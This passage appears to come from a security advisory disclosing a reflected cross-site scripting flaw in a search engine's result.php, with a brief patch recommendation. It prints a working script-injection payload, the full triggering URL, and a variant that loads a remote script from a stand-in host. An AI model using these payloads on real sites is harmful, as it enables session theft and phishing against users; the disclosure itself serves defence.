2) Security Issues
-------------------
The core module for Search engine is affected by a Non-Persistent Cross-Site Scripting
vulnerability.
The source in "mods/Core/result.php" doesn't properly sanitize the input of the user
and just get the submitted text without any previous check on the content.
The affected variable is $_GET['stringa'], as a matter of fact if we try to insert a
string like:
	"><script>alert(1);</script>
The website will retrieve an url like:
	host/path/mods.php?mods=Core&page=result&stringa=%22%3E%3Cscript%3Ealert%281
	%29%3C%2Fscript%3E&campo=all&criterio=tutte&ordine=decrescente

And it executes the JavaScript code.
The script makes only a check on apex, that can be simply avoided executing for 
example a remote script like
	"><script src=http://host.com/script.js></script>

It's easy to guess that this kind of vulnerability can be used to accomplish some
Phishing attacks, or whatever can be disfruted from an XSS flaw.


3) Patch
---------

Edit the core source code and sanitize properly the inputted data.
